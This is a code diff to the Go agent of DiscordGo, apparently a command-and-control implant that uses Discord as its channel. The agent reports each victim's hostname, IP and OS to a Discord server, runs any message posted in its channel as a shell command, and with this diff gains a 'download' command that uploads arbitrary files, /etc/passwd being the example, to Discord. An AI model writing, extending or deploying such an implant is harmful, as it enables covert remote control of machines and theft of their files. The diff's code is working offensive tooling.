@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"net"
 	"os"
@@ -12,7 +13,6 @@ import (
 	"time"
 
 	"github.com/emmaunel/DiscordGo/pkg/agent"
-	"github.com/emmaunel/DiscordGo/pkg/util"
 	"github.com/emmaunel/DiscordGo/pkg/util/constants"
 
 	"github.com/bwmarrin/discordgo"
@@ -25,9 +25,8 @@ var channelID *discordgo.Channel
 func init() {
 
 	newAgent = &agent.Agent{}
-	newAgent.UUID = util.GenerateUUID()
 	newAgent.HostName, _ = os.Hostname()
-	newAgent.IP = util.GetLocalIP()
+	newAgent.IP = agent.GetLocalIP()
 
 	sys := "Unknown"
 	if runtime.GOOS == "windows" {
@@ -48,17 +47,16 @@ func main() {
 		return
 	}
 
-	if util.DEBUG {
+	if agent.DEBUG {
 		fmt.Println("New Agent Info")
 		fmt.Println(newAgent.HostName)
-		fmt.Println(newAgent.UUID)
 		fmt.Println(newAgent.IP)
 		fmt.Println(newAgent.OS)
 		fmt.Println()
 	}
 
 	channelID, _ = dg.GuildChannelCreate(constants.ServerID, newAgent.IP, 0)
-	
+
 	sendMessage := "``` Hostname: " + newAgent.HostName + "\n IP:" + newAgent.IP + "\n OS:" + newAgent.OS + "```"
 	message, _ := dg.ChannelMessageSend(channelID.ID, sendMessage)
 	dg.ChannelMessagePin(channelID.ID, message.ID)
@@ -80,7 +78,7 @@ func main() {
 		return
 	}
 
-	if util.DEBUG {
+	if agent.DEBUG {
 		fmt.Println("Agent is now running.  Press CTRL-C to exit.")
 	}
 	// Wait here until CTRL-C or other term signal is received.
@@ -95,6 +93,7 @@ func main() {
 	dg.Close()
 
 }
+
 func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 	if !message.Author.Bot {
 		if message.ChannelID == channelID.ID {
@@ -148,6 +147,21 @@ func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) 
 					}
 				} else {
 					dg.ChannelMessageSend(message.ChannelID, "``` Incomplete command ```")
+				}
+			} else if strings.Contains(message.Content, "download") {
+				commandBreakdown := strings.Fields(message.Content)
+				if len(commandBreakdown) == 1 {
+					dg.ChannelMessageSend(message.ChannelID, "Please specify file(s): download /etc/passwd")
+					return
+				} else {
+					files := commandBreakdown[1:]
+					for _, file := range files {
+						fileReader, err := os.Open(file)
+						if err != nil {
+							dg.ChannelMessageSend(message.ChannelID, "Could not open file: "+file)
+						}
+						dg.ChannelFileSend(message.ChannelID, file, bufio.NewReader(fileReader))
+					}
 				}
 			} else {
 				output := executeCommand(message.Content)
@@ -206,7 +220,7 @@ func executeCommand(command string) string {
 		}
 
 		result = string(output)
-		if util.DEBUG {
+		if agent.DEBUG {
 			fmt.Println("Result: " + result)
 			fmt.Println(len(result))
 		}
@@ -221,7 +235,7 @@ func executeCommand(command string) string {
 		}
 
 		result = string(output)
-		if util.DEBUG {
+		if agent.DEBUG {
 			fmt.Println("Result: " + result)
 			fmt.Println(len(result))
 		}
